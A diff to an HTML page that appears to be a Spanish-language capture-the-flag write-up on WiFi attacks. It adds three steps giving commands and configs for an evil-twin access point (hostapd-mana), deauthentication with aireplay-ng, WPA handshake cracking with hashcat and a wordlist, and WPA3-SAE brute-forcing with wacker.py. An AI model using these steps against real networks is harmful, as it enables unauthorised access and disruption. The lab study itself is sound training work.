@@ -346,6 +346,129 @@ curl 192.168.2.7</pre
 
                     <div class="expandable-card">
                         <div class="card-header" onclick="toggleCard(this)">
+                            <h3>12. What is the wifi-offices password?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>
+                                Lo primero que deberemos de hacer es crear un archivo host.conf (el nombre puede ser
+                                diferente), el cual contenga el siguiente contenido
+                            </p>
+                            <pre>
+interface=wlan1
+driver=nl80211
+hw_mode=g
+channel=1
+ssid=wifi-offices
+mana_wpaout=hostapd.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678</pre
+                            >
+                            <p>
+                                <b>hostapd-mana host.conf:</b> Simula dicho punto de acceso para que se realicen las
+                                conexiones a nosotros
+                            </p>
+                            <p>
+                                <b>cat hostapd.hccapx | awk {'print $3'} > hostapd.22000:</b> Arregla el formato del
+                                archivo para poder usar hashcat
+                            </p>
+                            <p>
+                                <b>hashcat -a 0 -m 22000 hostapd.22000 ~/rockyou-top100000.txt --force:</b> Crackea los
+                                hashes para obtener la contraseña
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>13. What is the flag on the wifi-management AP website?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>
+                                <b
+                                    >./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management -- bssid
+                                    F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462:
+                                </b>
+                                Ademas de suplantar la identidad del punto de acceso, crackea la contraseña
+                            </p>
+                            <p>Crearemos un archivo de wifi.conf</p>
+                            <pre>
+network={ 
+    ssid="wifi-management" 
+    psk="chocolate1" 
+    key_mgmt=SAE 
+    scan_ssid=1 
+    ieee80211w=2 
+}</pre
+                            >
+                            <p>
+                                <b>wpa_supplicant -Dnl80211 -iwlan1 -c wifi.conf:</b> Para conectarse a la red wifi con
+                                dicha interfaz (wlan1)
+                            </p>
+                            <p><b>dhclient wlan1 -v:</b> Para obtener una IP en dicha interfaz (wlan1)</p>
+                            <p>Con esto entraremos a la IP 192.168.14.1 y obtendremos la flag</p>
+                        </div>
+                    </div>
+
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>14. What is the flag on the wifi-IT AP website?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Crearemos otro archivo host.conf</p>
+                            <pre>
+network={
+    ssid="wifi-IT"
+    bssid=F0:9F:C2:1A:CA:25
+    psk="bubblegum"
+    key_mgmt=SAE
+    scan_ssid=1
+    ieee80211w=0
+}</pre
+                            >
+                            <p>
+                                Importante hacer el hostapd-mana y el aireplay-ng a la vez, ya que si no, no funcionara
+                            </p>
+                            <p><b>hostapd-mana hostapd-sae.conf:</b> Simulamos el punto de acceso</p>
+                            <p>
+                                <b>iwconfig wlan0mon channel 11:</b> Cambiamos la interfaz de canal para poder usar
+                                herramientas
+                            </p>
+                            <p>
+                                <b>aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52:</b> Mandamos un
+                                ataque de deauth para que se conecten a nuestro punto de acceso simulado
+                            </p>
+                            <p>
+                                <b>cat hostapd.hccapx | awk {'print $3'} > hostapd.22000:</b> Formateamos correctamente
+                                el archivo de los hashes
+                            </p>
+                            <p>
+                                <b>hashcat -a 0 -m 22000 hostapd.22000 ~/rockyou-top100000.txt --force:</b> Crackeamos
+                                los hashes para obtener la contraseña
+                            </p>
+                            <p>Crearemos el archivo wifi.conf con el siguiente contenido</p>
+                            <pre>
+network={ 
+    ssid="wifi-IT" 
+    bssid=F0:9F:C2:1A:CA:25 
+    psk="bubblegum" 
+    key_mgmt=SAE 
+    scan_ssid=1 
+    ieee80211w=0 
+}</pre
+                            >
+                            <p>
+                                <b>wpa_supplicant -Dnl80211 -iwlan2 -c wifi.conf:</b> Para conectarse a la red wifi con
+                                dicha interfaz (wlan2)
+                            </p>
+                            <p><b>dhclient wlan2 -v:</b> Para obtener una IP en dicha interfaz (wlan2)</p>
+                            <p>Con esto entraremos a la IP 192.168.15.1 y obtendremos la flag</p>
+                        </div>
+                    </div>
+
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
                             <h3>En progreso...</h3>
                         </div>
                         <div class="card-content">
